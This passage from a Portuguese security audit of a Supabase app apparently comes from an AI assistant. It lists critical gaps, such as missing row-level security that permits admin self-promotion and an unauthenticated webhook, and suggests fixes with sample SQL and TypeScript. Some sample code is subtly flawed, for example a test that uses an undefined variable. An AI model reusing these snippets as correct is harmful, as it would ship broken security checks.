Policy depende de `profiles.is_admin`, mas `profiles` NÃO tem RLS! (Veja Crítico #2)

Isso significa que se um usuário se promover a admin (via ausência de RLS), ele pode acessar os backups.

**Solução:**

Após implementar RLS em `profiles` ou criar `admin_users` table separada, estas policies funcionarão corretamente.

---

## 💡 MELHORIAS SUGERIDAS

### 1. Implementar Audit Logging para Ações Sensíveis

Criar logs automáticos para:
- Mudanças em perfis de admin
- Acessos à tabela `approved_users`
- Modificações em `child_profiles`
- Uploads de ebooks

```sql
CREATE TABLE security_audit_log (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id),
  action TEXT NOT NULL,
  table_name TEXT NOT NULL,
  record_id UUID,
  old_data JSONB,
  new_data JSONB,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMP DEFAULT NOW()
);

-- Trigger automático para sensitive tables
CREATE OR REPLACE FUNCTION log_sensitive_changes()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO security_audit_log (user_id, action, table_name, record_id, old_data, new_data)
  VALUES (
    auth.uid(),
    TG_OP,
    TG_TABLE_NAME,
    COALESCE(NEW.id, OLD.id),
    row_to_json(OLD),
    row_to_json(NEW)
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Aplicar a child_profiles:
CREATE TRIGGER audit_child_profiles
AFTER INSERT OR UPDATE OR DELETE ON child_profiles
FOR EACH ROW EXECUTE FUNCTION log_sensitive_changes();
```

### 2. Adicionar MFA (Multi-Factor Authentication)

Supabase suporta MFA via TOTP. Implementar para admins:

```typescript
// Enable MFA for admin users
const { data, error } = await supabase.auth.mfa.enroll({
  factorType: 'totp',
});

// Admin login flow:
// 1. OTP email (já implementado)
// 2. TOTP code from authenticator app
```

### 3. Implementar IP Whitelisting para Admin Panel

```sql
CREATE TABLE admin_allowed_ips (
  ip_address INET PRIMARY KEY,
  description TEXT,
  created_at TIMESTAMP DEFAULT NOW()
);

-- Policy que verifica IP:
CREATE POLICY "Admins must be on allowed IP"
ON admin_audit_log FOR SELECT
TO authenticated
USING (
  is_admin()
  AND EXISTS (
    SELECT 1 FROM admin_allowed_ips
    WHERE ip_address = inet_client_addr()
  )
);
```

### 4. Adicionar Helmet.js para Headers de Segurança Adicionais

```bash
npm install helmet
```

```typescript
// Adicionar headers via middleware (se usar SSR) ou vercel.json:
{
  "headers": [
    {
      "key": "X-Content-Type-Options",
      "value": "nosniff"
    },
    {
      "key": "X-XSS-Protection",
      "value": "1; mode=block"
    },
    {
      "key": "Referrer-Policy",
      "value": "strict-origin-when-cross-origin"
    },
    {
      "key": "Strict-Transport-Security",
      "value": "max-age=31536000; includeSubDomains"
    }
  ]
}
```

### 5. Implementar Content Hashing para Integridade

Adicionar Subresource Integrity (SRI) para scripts externos:

```html
<script
  src="https://cdn.onesignal.com/sdks/OneSignalSDK.js"
  integrity="sha384-HASH_HERE"
  crossorigin="anonymous"
></script>
```

### 6. Criar Testes de Segurança Automatizados

```typescript
// tests/security/rls.test.ts
describe('RLS Policies', () => {
  it('should prevent users from accessing other users profiles', async () => {
    const user1Client = createClient(SUPABASE_URL, ANON_KEY);
    const user2Client = createClient(SUPABASE_URL, ANON_KEY);

    // Login as user1
    await user1Client.auth.signInWithOtp({ email: 'user1@test.com' });

    // Login as user2
    await user2Client.auth.signInWithOtp({ email: 'user2@test.com' });

    // User2 tenta acessar dados de User1
    const { data, error } = await user2Client
      .from('profiles')
      .select('*')
      .eq('id', user1.id);

    expect(error).toBeDefined();
    expect(data).toBeNull();
  });
});
```

---

## 📊 MÉTRICAS DE SEGURANÇA

| Métrica | Valor | Status |
|---------|-------|--------|
| **RLS Coverage** | ~10% (7 de ~70 tabelas estimadas) | 🔴 CRÍTICO |
| **Tabelas com dados sensíveis expostos** | 5+ (profiles, child_profiles, approved_users, admin_audit_log, app_config) | 🔴 CRÍTICO |
| **Policies com potencial de privilege escalation** | 0 (mas falta RLS em profiles) | 🔴 CRÍTICO |
| **Input validation coverage** | ~80% (Zod schemas presentes) | 🟡 MÉDIO |
| **XSS protection (DOMPurify)** | 0% (não instalado) | 🔴 CRÍTICO |
| **CSP strictness** | 30% (permite unsafe-inline/eval) | 🟡 MÉDIO |
| **API authentication** | 50% (Cartpanda webhook sem auth) | 🔴 CRÍTICO |
| **Secrets management** | 95% (1 hardcoded em upload-ebook) | 🟡 MÉDIO |
| **LGPD/GDPR compliance** | 40% (falta export/delete) | 🔴 CRÍTICO |
| **Rate limiting** | Client-side only | 🟡 MÉDIO |
| **Audit logging** | Presente em admin_audit_log (mas sem RLS!) | 🔴 CRÍTICO |
| **MFA support** | Não implementado | ⚪ NICE TO HAVE |

**Score Final:** 4.5/10 🔴

---

## 🎯 RECOMENDAÇÕES PRIORITÁRIAS

### URGENTE (Fazer AGORA - blockers do CartPanda):

1. **[CRÍTICO 1]** Habilitar RLS em TODAS as tabelas com dados sensíveis:
   - `profiles` ⚠️ MAIS CRÍTICO
   - `child_profiles` ⚠️ DADOS DE MENORES
   - `approved_users` ⚠️ DADOS FINANCEIROS
   - `admin_audit_log` ⚠️ LOGS DE ADMIN
   - `app_config`
   - Todas as outras tabelas user-specific

   **Estimativa:** 2-4 horas
   **Impacto:** Previne 90% das vulnerabilidades críticas

2. **[CRÍTICO 2]** Proteger campo `is_admin` com policy que previne auto-elevação:

   **Estimativa:** 30 minutos
   **Impacto:** Previne privilege escalation

3. **[CRÍTICO 3]** Adicionar autenticação ao Cartpanda webhook:

   **Estimativa:** 1 hora
   **Impacto:** Previne criação fraudulenta de contas premium

4. **[CRÍTICO 4]** Remover hardcoded secrets de `upload-ebook`:

   **Estimativa:** 15 minutos
   **Impacto:** Previne exposição de credentials

5. **[CRÍTICO 6]** Implementar export/delete de dados (LGPD/GDPR):

   **Estimativa:** 3-4 horas
   **Impacto:** Compliance legal obrigatório

### ALTA PRIORIDADE (Fazer esta semana):

6. **[CRÍTICO 5]** Instalar DOMPurify e sanitizar todo user-generated content:

   **Estimativa:** 2-3 horas
   **Impacto:** Previne XSS attacks

7. **[CRÍTICO 7]** Remover `unsafe-inline` e `unsafe-eval` do CSP:

   **Estimativa:** 2-4 horas (pode quebrar coisas)
   **Impacto:** Hardening contra XSS

8. **[MÉDIO 1]** Restringir CORS em Edge Functions:

   **Estimativa:** 30 minutos
   **Impacto:** Previne CSRF attacks

### MÉDIA PRIORIDADE (Fazer este mês):

9. **[CRÍTICO 8]** Ajustar Service Worker para não cachear dados sensíveis:

   **Estimativa:** 1-2 horas
   **Impacto:** Previne vazamento via cache

10. **[MÉDIO 2]** Implementar rate limiting server-side:

    **Estimativa:** 3-4 horas
    **Impacto:** Previne abuse de APIs

11. **[MELHORIA 1]** Implementar audit logging para ações sensíveis:

    **Estimativa:** 2-3 horas
    **Impacto:** Rastreabilidade e compliance

### BAIXA PRIORIDADE (Nice to have):

12. **[MELHORIA 2]** Implementar MFA para admins
13. **[MELHORIA 3]** IP whitelisting para admin panel
14. **[MELHORIA 4]** Headers adicionais via Helmet.js
15. **[MELHORIA 6]** Testes automatizados de segurança

---

## 🔍 CONCLUSÃO

A aplicação tem **bases sólidas** de autenticação e validation, mas **falha criticamente** em proteção de dados no database. A ausência de RLS é um **blocker absoluto** para qualquer auditoria de segurança profissional.

**Para aprovação do CartPanda, é OBRIGATÓRIO:**
1. ✅ RLS em todas as tabelas sensíveis
2. ✅ Proteção do campo `is_admin`
3. ✅ Autenticação do webhook
4. ✅ Funcionalidades de LGPD/GDPR (export/delete)
5. ✅ Sanitização XSS

**Prioridade máxima:** Implementar itens 1-5 da seção "URGENTE" ANTES de submeter para auditoria.

**Tempo estimado total:** 8-12 horas de desenvolvimento + 2-4 horas de testes.

---

**📅 Próximos Passos:**

1. ✅ Criar branch `security/critical-fixes`
2. ✅ Implementar RLS policies (Crítico 1 + 2)
3. ✅ Adicionar autenticação webhook (Crítico 3)
4. ✅ Remover hardcoded secrets (Crítico 4)
5. ✅ Implementar LGPD compliance (Crítico 6)
6. ✅ Instalar DOMPurify (Crítico 5)
7. ✅ Testar extensivamente
8. ✅ Merge e deploy
9. ✅ Re-submeter para CartPanda audit

---

**🤖 Gerado por:** Claude Sonnet 4.5 - Security Audit
**📧 Contato:** Para questões sobre esta auditoria, consulte a documentação ou abra um issue.
